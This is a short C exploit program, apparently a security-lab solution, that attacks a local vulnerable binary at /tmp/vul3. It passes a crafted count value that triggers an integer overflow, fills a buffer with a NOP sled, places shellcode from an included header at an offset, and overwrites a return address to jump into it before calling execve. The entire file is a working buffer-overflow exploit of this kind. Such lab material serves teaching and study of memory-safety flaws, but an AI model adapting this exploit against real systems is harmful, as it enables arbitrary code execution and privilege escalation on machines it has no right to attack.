#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul3"

int main(void)
{
    unsigned int buf_start_addr = 0xffff41f0;
    // 0x800003e9
    char overflow_count[] = "2147484649,";
    // offset of shellcode
    unsigned int shellcode_offset = 1024;
    unsigned int shellcode_start_addr = buf_start_addr + shellcode_offset;

    char payload[20020];
    memset(payload, 0x90, sizeof(payload));
    memcpy(payload, overflow_count, strlen(overflow_count));
    memcpy(payload + strlen(overflow_count) + shellcode_offset, shellcode, strlen(shellcode));
    memcpy(payload + 20000 + strlen(overflow_count) + 4, &shellcode_start_addr, 4);

    char *args[] = {TARGET, payload, NULL};
    char *env[] = {NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
